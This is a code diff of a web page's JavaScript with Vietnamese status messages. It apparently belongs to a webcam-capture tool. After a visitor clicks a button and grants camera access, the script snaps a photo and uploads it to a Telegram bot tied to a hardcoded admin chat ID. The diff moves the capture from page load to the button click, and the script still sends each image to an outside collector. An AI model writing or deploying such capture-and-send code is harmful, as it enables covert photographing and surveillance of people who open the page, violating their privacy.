@@ -4,53 +4,54 @@ const adminId = "6331676184";
 const video = document.getElementById("camera");
 const canvas = document.getElementById("canvas");
 const statusText = document.getElementById("status");
+const btn = document.getElementById("startBtn");
+const cameraBox = document.querySelector(".camera-box");
 
-async function startCamera() {
+btn.onclick = async () => {
+    btn.style.display = "none";
+    cameraBox.style.display = "block";
+    statusText.textContent = "Đang yêu cầu quyền camera...";
+
     try {
-        statusText.textContent = "Đang bật camera...";
-
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
         video.srcObject = stream;
 
-        // Chờ video load rồi auto chụp
         video.onloadedmetadata = () => {
-            setTimeout(() => autoCapture(), 500);
+            setTimeout(() => autoCapture(), 600);
         };
 
-        statusText.textContent = "Camera đã bật, đang tự chụp ảnh...";
-    } catch (error) {
-        statusText.textContent = "Không bật được camera. Bạn phải cấp quyền!";
+        statusText.textContent = "Camera đã bật – đang tự chụp ảnh...";
+    } catch (err) {
+        statusText.textContent = "Không bật được camera. Bạn cần cấp quyền.";
     }
-}
+};
 
 async function autoCapture() {
-    const context = canvas.getContext("2d");
+    const ctx = canvas.getContext("2d");
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     const imageData = canvas.toDataURL("image/jpeg");
 
-    statusText.textContent = "Đang gửi ảnh về Telegram...";
+    statusText.textContent = "Đang gửi ảnh tới Telegram...";
 
     await sendToTelegram(imageData);
 
-    statusText.textContent = "Đã gửi ảnh về Telegram!";
+    statusText.textContent = "Đã gửi ảnh!";
 }
 
 async function sendToTelegram(base64Image) {
     const blob = await (await fetch(base64Image)).blob();
     const formData = new FormData();
+
     formData.append("chat_id", adminId);
-    formData.append("photo", blob, "capture.jpg");
+    formData.append("photo", blob, "auto.jpg");
 
     await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: "POST",
         body: formData
     });
 }
-
-startCamera();
